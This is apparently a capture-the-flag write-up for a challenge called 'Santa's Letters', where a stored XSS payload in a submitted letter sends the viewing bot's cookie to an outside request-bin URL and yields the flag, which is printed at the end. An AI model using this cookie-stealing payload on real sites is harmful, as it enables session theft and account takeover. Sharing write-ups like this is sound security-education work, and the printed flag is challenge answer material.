## Santa's Letters 

> Santa wanted to receive letters as usual this year, but in a covid-friendly way, so he built a website! Be nice!

We are given a website to submit letters to Santa. Since "Santa" will view each of the notes, we can grab Santa's cookie using an XSS attack. We do this by putting javascript code to send a request to a server along with his cookie. Here is the payload:

```
<script>
var xhr=new XMLHttpRequest(); xhr.open('GET', 'https://enh7fwgyjeyaa.x.pipedream.net/'.concat(document.cookie), true);xhr.send();
</script>
```

Looking at my request bin, I am given a request with the flag (the flag was the cookie).

> IceCTF{I_h0pe_yoU_h4venT_b33n_n4ugHty_th1s_y3aR}